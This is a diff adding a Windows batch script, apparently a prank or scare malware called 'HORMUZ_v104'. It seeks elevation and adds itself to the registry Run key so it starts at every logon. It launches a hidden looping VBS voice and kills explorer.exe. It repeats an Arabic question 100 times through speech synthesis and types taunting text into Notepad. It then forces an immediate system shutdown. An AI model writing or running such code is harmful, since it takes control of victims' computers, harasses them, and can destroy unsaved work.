@@ -1,0 +1,54 @@
+@echo off
+:: [PHASE 0: STEALTH & PERSISTENCE]
+chcp 65001 >nul
+if not "%1"=="am_admin" (powershell -Command "Start-Process -Verb RunAs -FilePath '%0' -ArgumentList 'am_admin'" & exit /b)
+powershell -WindowStyle Hidden -Command ""
+
+:: [PHASE 1: THE PERSISTENCE]
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "HormuzHysteria" /t REG_SZ /d "%~f0" /f >nul 2>&1
+
+:: [PHASE 2: THE VOICES OF THE ABYSS]
+set "id=%random%"
+set "f_vbs=%temp%\%id%_hysteria.vbs"
+(
+echo Dim S: Set S = CreateObject("SAPI.SpVoice"): S.Volume = 100
+echo Do
+echo    S.Rate = -10: S.Speak "Marg dar tangeh. 𓅓𓅱𓏏"
+echo    WScript.Sleep 20000
+echo Loop
+) > "%f_vbs%"
+start /b wscript "%f_vbs%"
+
+:: [PHASE 3: THE CHAOS MATRIX]
+powershell -Command "Stop-Process -Name explorer -Force" >nul 2>&1
+
+:: [PHASE 4: THE SONIC EVOLUTION (Melody -> Scream -> Laugh)]
+powershell -Command "[console]::beep(783, 600); [console]::beep(880, 600); [console]::beep(932, 1200)"
+powershell -Command "for ($i=1000; $i -le 6000; $i+=300) { [console]::beep($i, 40) }"
+
+:: [PHASE 5: THE 100x HYSTERICAL QUESTION]
+:: هذه المصفوفة تقوم بتغيير سرعة وحدّة الصوت في كل مرة (100 مرة)
+powershell -Command "$s = New-Object -ComObject SAPI.SpVoice; for($i=1; $i -le 100; $i++){ $s.Rate = (Get-Random -Min -10 -Max 10); $s.Speak('لماذا لا تضحك؟'); }"
+
+:: [PHASE 6: THE PHANTOM TYPIST]
+start notepad.exe
+timeout /t 1 >nul
+powershell -Command "$w = New-Object -ComObject WScript.Shell; while(!$w.AppActivate('Notepad')){Sleep 1}; $m = '100 سؤال... ولا جواب؟.. لماذا لا تضحك معي؟.. 𓅓𓅱𓏏 .. النجمة ⭐ تلتهم صمتك.'; foreach($c in $m.ToCharArray()){$w.SendKeys($c); Sleep -m 40}"
+
+:: [PHASE 7: FINAL RED SCREEN OF MADNESS]
+color 4f
+cls
+echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+echo !  [HORMUZ_v104]: 100 QUESTIONS OF MADNESS        !
+echo !  [MESSAGE]: لماذا لا تضحك؟ (x100)               !
+echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+echo !  THE STAR IS WATCHING. ⭐ 𓅓𓅱𓏏                   !
+echo !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
+
+:: الضحكة النهائية العشوائية
+powershell -Command "$s = New-Object -ComObject SAPI.SpVoice; $s.Rate = 5; $s.Speak('Ha ha ha ha ha!')"
+
+:: [PHASE 8: TOTAL SYSTEM COLLAPSE]
+timeout /t 5 >nul
+powershell -Command "wininit" >nul 2>&1
+shutdown -s -f -t 00 -c "𓅓𓅱𓏏.. لقد انتهت الـ 100 سؤال."
